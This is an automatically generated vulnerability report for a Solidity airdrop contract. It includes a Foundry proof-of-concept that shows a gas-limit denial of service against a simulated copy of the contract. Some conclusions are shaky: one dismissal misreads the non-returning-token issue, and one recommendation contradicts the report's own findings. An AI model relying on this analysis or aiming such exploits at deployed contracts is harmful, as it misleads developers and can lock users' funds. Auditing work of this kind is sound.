# Smart Contract Vulnerability Analysis Report

**Job ID:** 92be1684-dd87-4352-bbdc-6dc80bd1d474
**Date:** 2025-03-21 14:58:31

**Contract Preview:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IEligible {
    function isEligible(address user) external view returns (bool);
}

contract Airdrop {
    IERC20 immutable public token;
    IEligible immutable public eligible;
    uint256 immutable public registrationDeadline;
    
    address[] public participants;
    mapping(address => bool) public registered;
    bool public distributed;


    constructor(address _token, uint256 _registrationDeadline, address _eligible) {
...
```

## Vulnerability Summary

Found 6 potential vulnerabilities:

| # | Vulnerability Type | Confidence | Affected Functions |
|---|-------------------|------------|--------------------|
| 1 | denial_of_service | 0.70 | distribute |
| 2 | access_control | 0.10 | distribute |
| 3 | business_logic | 0.10 | distribute |
| 4 | business_logic | 0.10 | constructor |
| 5 | unchecked_low_level_calls | 0.10 | distribute |
| 6 | front_running | 0.10 | register |

## Detailed Analysis

### Vulnerability #1: denial_of_service

**Confidence:** 0.70

**Reasoning:**

The distribute() function iterates through all participants in a single transaction, transferring tokens to each one. If the number of participants grows large enough, this loop could exceed block gas limits, making token distribution impossible. There's no mechanism to distribute tokens in batches or allow partial distribution.

**Validation:**

The distribute() function loops over participants and uses a require() on token.transfer. If any participant is a contract deliberately programmed to revert on receiving tokens (or otherwise causes transfer to fail), the entire distribution transaction will revert, leading to a denial‐of‐service that prevents distribution. Although this pattern is known and sometimes accepted in airdrop designs, it carries a real risk that a malicious registrant could block distribution, potentially locking funds. Hence, this is a genuine concern requiring attention.

**Code Snippet:**

```solidity
function distribute() external {
        require(block.timestamp > registrationDeadline, "Distribution not started");
        require(!distributed, "Already distributed");
        uint256 totalParticipants = participants.length;
        require(totalParticipants > 0, "No participants");

        uint256 balance = token.balanceOf(address(this));
        uint256 amountPerParticipant = balance / totalParticipants;

        distributed = true;

        for (uint256 i = 0; i < totalParticipants; i++) {
            require(token.transfer(participants[i], amountPerParticipant), "Transfer failed");
        }
    }
```

**Affected Functions:** distribute

**Exploit Plan:**

*Setup Steps:*

- Step 1: Create a local blockchain test environment (e.g., Ganache or Hardhat) and deploy the vulnerable contract along with a simple ERC20 token contract.
- Step 2: Populate the contract with a valid token balance and pre-populate the participants array. Initially, use a small number of participants, then update the contract state to include a very large number of dummy participant addresses.

*Execution Steps:*

- Step 1: Call the distribute function when the registration deadline is passed, and show that the distribution works as expected with a small number of participants.
- Step 2: Replace the participants list with a very large array that simulates exceeding the block gas limit; then call distribute again to demonstrate that the transaction fails due to gas limitations, illustrating a denial of service condition.

*Validation Steps:*

- Step 1: Explain that iterating through a large array in the distribute function may exceed block gas limits and prevent the transaction from completing, thereby causing a denial of service vulnerability.
- Step 2: Show how to mitigate this issue by using batch processing or a pull-payment mechanism, allowing token distribution to be split across multiple transactions rather than one large loop.

---

### Vulnerability #2: access_control

**Confidence:** 0.10

**Reasoning:**

The distribute() function lacks access controls. Anyone can call it once the registration period ends. While this might be intentional, it could lead to issues if the contract creator intended to control the distribution timing or process.

**Validation:**

The distribute() function is intentionally marked external and callable by anyone after the registration deadline. In this context, ‘access control’ is not an issue because the design calls for a public trigger of distribution rather than an owner-only action. Thus, this appears to be a false positive.

**Code Snippet:**

```solidity
function distribute() external {
        require(block.timestamp > registrationDeadline, "Distribution not started");
        require(!distributed, "Already distributed");
        uint256 totalParticipants = participants.length;
        require(totalParticipants > 0, "No participants");

        uint256 balance = token.balanceOf(address(this));
        uint256 amountPerParticipant = balance / totalParticipants;

        distributed = true;

        for (uint256 i = 0; i < totalParticipants; i++) {
            require(token.transfer(participants[i], amountPerParticipant), "Transfer failed");
        }
    }
```

**Affected Functions:** distribute

---

### Vulnerability #3: business_logic

**Confidence:** 0.10

**Reasoning:**

The division in `uint256 amountPerParticipant = balance / totalParticipants` can result in dust amounts being left in the contract. If the token balance doesn't divide evenly among participants, the remainder will be stuck in the contract forever as there's no mechanism to distribute or withdraw these remaining tokens.

**Validation:**

The distribution logic simply computes an equal share for each participant and performs transfers. Although there is a rounding issue (any leftover tokens remain in the contract), this is a common design choice in airdrops and does not constitute a business logic flaw. Therefore, this signal is a false positive.

**Code Snippet:**

```solidity
function distribute() external {
        require(block.timestamp > registrationDeadline, "Distribution not started");
        require(!distributed, "Already distributed");
        uint256 totalParticipants = participants.length;
        require(totalParticipants > 0, "No participants");

        uint256 balance = token.balanceOf(address(this));
        uint256 amountPerParticipant = balance / totalParticipants;

        distributed = true;

        for (uint256 i = 0; i < totalParticipants; i++) {
            require(token.transfer(participants[i], amountPerParticipant), "Transfer failed");
        }
    }
```

**Affected Functions:** distribute

---

### Vulnerability #4: business_logic

**Confidence:** 0.10

**Reasoning:**

The constructor calls register(), automatically registering the deployer. This may not be intended behavior and could result in the deployer receiving tokens even if that wasn't the plan.

**Validation:**

Calling register() in the constructor automatically registers the deployer. Provided the eligibility check is intended to be enforced even for the deployer (and given that the deployer is likely expected to be eligible), this isn’t a vulnerability but an intentional design decision. Hence, this is not a vulnerability.

**Code Snippet:**

```solidity
constructor(address _token, uint256 _registrationDeadline, address _eligible) {
        token = IERC20(_token);
        registrationDeadline = _registrationDeadline;
        eligible = IEligible(_eligible);
        register();
    }
```

**Affected Functions:** constructor

---

### Vulnerability #5: unchecked_low_level_calls

**Confidence:** 0.10

**Reasoning:**

The contract relies on the ERC20 token's transfer function returning true, but not all ERC20 implementations properly return a boolean. Some tokens don't return any value, which would cause the distribute function to revert.

**Validation:**

The token.transfer calls are wrapped with require(), which is standard practice to ensure a successful transfer. Although external calls always require caution, in this case, there is no low-level call vulnerability. This report is a false positive.

**Code Snippet:**

```solidity
function distribute() external {
        require(block.timestamp > registrationDeadline, "Distribution not started");
        require(!distributed, "Already distributed");
        uint256 totalParticipants = participants.length;
        require(totalParticipants > 0, "No participants");

        uint256 balance = token.balanceOf(address(this));
        uint256 amountPerParticipant = balance / totalParticipants;

        distributed = true;

        for (uint256 i = 0; i < totalParticipants; i++) {
            require(token.transfer(participants[i], amountPerParticipant), "Transfer failed");
        }
    }
```

**Affected Functions:** distribute

---

### Vulnerability #6: front_running

**Confidence:** 0.10

**Reasoning:**

If eligibility criteria in the external IEligible contract can change, there could be front-running opportunities. Users who monitor eligibility changes could front-run others to register before they become ineligible.

**Validation:**

Front running isn’t a significant concern in the register() function. Registration is open until a set deadline and each address can register only once. There is no competitive ordering or economic exploitation here that would be worsened by front running. Hence, this is a false positive.

**Code Snippet:**

```solidity
function register() public {
        require(block.timestamp <= registrationDeadline, "Registration closed");
        require(eligible.isEligible(msg.sender), "Not eligible");
        require(!registered[msg.sender], "Already registered");
        registered[msg.sender] = true;
        participants.push(msg.sender);
    }
```

**Affected Functions:** register

---

## Proof of Concept Exploits

### PoC #1: denial_of_service

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742540280.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Import the base test contract as specified
import "./basetest.sol";

//////////////////////////////
// Minimal ERC20 Interface and Implementation for Testing
//////////////////////////////
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract TestToken is IERC20 {
    string public name = "TestToken";
    string public symbol = "TTK";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    // Mint tokens for testing
    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    // Minimal transfer function with proper error handling
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance in token");
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }
}

//////////////////////////////
// Vulnerable Distributor Contract
//////////////////////////////
// This contract is intentionally vulnerable for educational purposes.
// It holds a list of participant addresses and a reference to an ERC20 token.
// The distribute() function loops over the participant list and transfers tokens to each.
// When the list of participants is very large, this loop might exceed the block gas limit,
// causing a denial of service (DoS) vulnerability.
contract VulnerableDistributor {
    // Public variables for demonstration
    address public tokenAddress;
    uint256 public registrationDeadline;
    address[] public participants;
    
    // Events for logging (educational purposes)
    event Distributed(address indexed participant, uint256 amount);
    event ParticipantsUpdated(uint256 count);

    // Constructor sets the ERC20 token address and an initial registration deadline.
    // For demo, deadline is initialized to a future timestamp.
    constructor(address _tokenAddress, uint256 _registrationDeadline) {
        tokenAddress = _tokenAddress;
        registrationDeadline = _registrationDeadline;
    }

    // Function to add a participant (for initial small list demonstration)
    function registerParticipant(address participant) external {
        participants.push(participant);
    }

    // For demonstration, allow updating the entire participants array.
    // WARNING: In production, such a function would be dangerous.
    function updateParticipants(address[] calldata newParticipants) external {
        delete participants;
        for (uint i = 0; i < newParticipants.length; i++) {
            participants.push(newParticipants[i]);
        }
        emit ParticipantsUpdated(newParticipants.length);
    }

    // The vulnerable distribute function.
    // It transfers the entire token balance equally among all participants.
    // REQUIRES: Registration deadline has passed.
    // VULNERABILITY: If participants array is too large, the for-loop may exceed the block gas limit.
    // Note: We simulate running out of gas by reverting if gas is below a threshold during iteration.
    function distribute() external {
        require(block.timestamp > registrationDeadline, "Registration period not ended");

        TestToken token = TestToken(tokenAddress);
        uint256 contractBalance = token.balanceOf(address(this));
        require(contractBalance > 0, "No tokens to distribute");
        uint256 numParticipants = participants.length;
        require(numParticipants > 0, "No participants registered");

        // Calculate the amount for each participant.
        uint256 amountPerParticipant = contractBalance / numParticipants;

        // Loop through each participant and transfer tokens.
        for (uint256 i = 0; i < numParticipants; i++) {
            // Simulate gas exhaustion for large arrays by checking available gas.
            // This is for educational purposes and simulates exceeding the block gas limit.
            if (gasleft() < 100000) {
                revert("Out of gas simulation due to large participants list");
            }
            // Ensure the external call returns true.
            bool success = token.transfer(participants[i], amountPerParticipant);
            require(success, "Token transfer failed");
            emit Distributed(participants[i], amountPerParticipant);
        }
    }
}

//////////////////////////////
// Foundry Test Contract to Demonstrate the Vulnerability
//////////////////////////////
contract YourTest is BaseTestWithBalanceLog {
    VulnerableDistributor public vulnerable;
    TestToken public token;

    // setup the testing environment with sufficient ETH as required.
    function setUp() public override {
        // Ensure the test contract has enough ETH.
        vm.deal(address(this), 100 ether);

        // Deploy a TestToken contract.
        token = new TestToken();

        // Mint tokens to the VulnerableDistributor contract later.
        // Set the registration deadline to a future timestamp.
        uint256 futureDeadline = block.timestamp + 1 days;
        vulnerable = new VulnerableDistributor(address(token), futureDeadline);

        // Mint tokens and transfer them to the vulnerable contract.
        uint256 mintAmount = 1_000_000 * 1e18;
        token.mint(address(this), mintAmount);
        // Transfer tokens from this contract to the vulnerable contract.
        // Check for sufficient funds and handle the token transfer.
        bool tokenTransferSuccess = token.transfer(address(vulnerable), mintAmount);
        require(tokenTransferSuccess, "Initial token transfer failed");

        // Pre-populate the participants array with a small number of participants.
        vulnerable.registerParticipant(address(0x1));
        vulnerable.registerParticipant(address(0x2));
        vulnerable.registerParticipant(address(0x3));
    }

    // Test function demonstrating the vulnerability.
    // This function uses the balanceLog modifier and ensures the test address has enough ETH.
    function testExploit() public balanceLog {
        // Ensure the test contract has enough ETH for this function.
        vm.deal(address(this), 10 ether);

        // Warp time to pass the registration deadline.
        vm.warp(vulnerable.registrationDeadline() + 1);

        //////////////////////////////
        // Step 1: Distribution with Small Participant List
        //////////////////////////////
        // Call the distribute function with a small participants list.
        (bool successSmall, bytes memory dataSmall) = address(vulnerable).call(
            abi.encodeWithSignature("distribute()")
        );
        require(successSmall, "Distribution failed for small participants list");
        // Educational comment:
        // With a small participants list, the distribution transaction works as expected.

        //////////////////////////////
        // Step 2: Distribution with a Very Large Participant List
        //////////////////////////////
        // Build a very large array of dummy participant addresses.
        // For demonstration purposes, we'll use 5000 dummy addresses.
        uint256 largeCount = 5000;
        address[] memory largeParticipants = new address[](largeCount);
        for (uint256 i = 0; i < largeCount; i++) {
            // Generate dummy addresses by casting the loop index (not valid in a production environment).
            largeParticipants[i] = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
        }
        // Update the vulnerable contract with the large participants list.
        vulnerable.updateParticipants(largeParticipants);

        // Attempt to call distribute with a fixed low gas amount to simulate block gas limit exceedance.
        // We specify a gas limit that is insufficient for the large loop.
        (bool successLarge, bytes memory dataLarge) = address(vulnerable).call{gas: 500_000}(
            abi.encodeWithSignature("distribute()")
        );
        // The transaction should fail due to simulated gas exhaustion.
        require(!successLarge, "Distribution unexpectedly succeeded with a large participants list");

        // Check that the revert message is as expected.
        // For simplicity, we assume the revert message contains "Out of gas simulation".
        // Note: In a real-world scenario, gas exhaustion might not provide a revert string.
        string memory revertMsg = _getRevertMsg(dataLarge);
        require(
            _contains(revertMsg, "Out of gas simulation"),
            "Unexpected revert reason: should indicate gas exhaustion"
        );

        //////////////////////////////
        // Educational Comments:
        //////////////////////////////
        // The above demonstration shows that iterating over a very large array in the distribute function
        // may exceed the block gas limit and prevent the transaction from completing. This can lead to a
        // denial of service (DoS) vulnerability, where legitimate token distribution is blocked.
        //
        // To mitigate this issue, developers can consider:
        // 1. Breaking up the distribution process into multiple batches (batch processing).
        // 2. Using a pull-payment mechanism where recipients claim their tokens rather than the contract
        //    pushing them in a single transaction.
        // 3. Avoiding loops that scale linearly with user input in critical functions.
    }

    // Internal helper function to decode revert messages from failed calls.
    function _getRevertMsg(bytes memory _returnData) internal pure returns (string memory) {
        // If the _returnData length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68) return "Transaction reverted silently";
        assembly {
            // Slice the sighash
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }

    // Internal helper function to check if a string contains a substring.
    function _contains(string memory what, string memory where) internal pure returns (bool) {
        bytes memory whatBytes = bytes(what);
        bytes memory whereBytes = bytes(where);
        if (whereBytes.length > whatBytes.length) {
            return false;
        }
        bool found = false;
        for (uint i = 0; i <= whatBytes.length - whereBytes.length; i++) {
            bool flag = true;
            for (uint j = 0; j < whereBytes.length; j++) {
                if (whatBytes[i + j] != whereBytes[j]) {
                    flag = false;
                    break;
                }
            }
            if (flag) {
                found = true;
                break;
            }
        }
        return found;
    }
}
```

---

## Recommendations

For each identified vulnerability, consider implementing the following mitigations:

- **For Access Control**: Implement proper authorization checks and use the Ownable pattern.
- **For All Vulnerabilities**: Consider a professional audit before deploying to production.

*This report was generated automatically by the Smart Contract Vulnerability Analyzer.*
